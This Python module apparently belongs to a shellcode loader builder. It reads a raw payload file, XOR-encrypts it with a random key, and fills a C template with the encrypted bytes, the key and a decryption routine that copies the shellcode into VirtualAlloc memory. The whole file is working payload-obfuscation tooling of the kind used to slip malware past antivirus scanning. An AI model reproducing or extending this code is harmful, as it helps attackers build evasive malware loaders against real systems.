import os
import sys
import random

def desc():
    return "XOR Encryption"

def getPayload():
    filename = './payload.bin'
    try:
        with open(filename, 'rb') as file:
            # Read the entire file
            file_content = file.read()
            return file_content
    except IOError as e:
        print("[!] I/O error({0}): {1}".format(e.errno, e.strerror))
        raise
    
def get_hex_string(data):
    result = ''

    for i in range(0, len(data), 16):
        result += "\t"
        chunk = data[i:i+16]
        for byte in chunk:
            result += f"0x{byte:02x}, "
        result += "\n"

    return result[1:-3]

def xor_by_input_key(payload, key):
    modified_payload = bytearray(len(payload))
    key_size = len(key)
    j = 0
    for i in range(len(payload)):
        if j >= key_size:
            j = 0
        modified_payload[i] = payload[i] ^ key[j]
        j += 1
    return modified_payload

def fill_template(encrypted, key):
    functions = ''' \
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize){
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}
'''

    functions += "\nunsigned char pKey[] = {" + key + "};"

    payload_mods = ''' \
    SIZE_T      	sPayloadSize	= sizeof(pPayload);

    // Allocating buffer to hold decrypted shellcode
    PBYTE pShellcode = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy encrypted shellcode to decrypted shellcode buffer
    if (pShellcode)
        memcpy(pShellcode, pPayload, sPayloadSize);

	// Decryption
	XorByInputKey(pShellcode, sPayloadSize, pKey, sizeof(pKey));
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{PAYLOAD}}", encrypted) \
                              .replace("{{PAYLOAD_MODS}}", payload_mods)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

def run():
    original_data = getPayload()

    # Generate random key (size 16)
    key = bytearray(random.randint(0, 255) for _ in range(16))
    key_str = ", ".join([f"0x{byte:02x}" for byte in key])

    # Encrypt data
    encrypted_data = xor_by_input_key(bytearray(original_data), key)
    encrypted_str = get_hex_string(encrypted_data)

    # Fill template
    fill_template(encrypted_str, key_str)

    return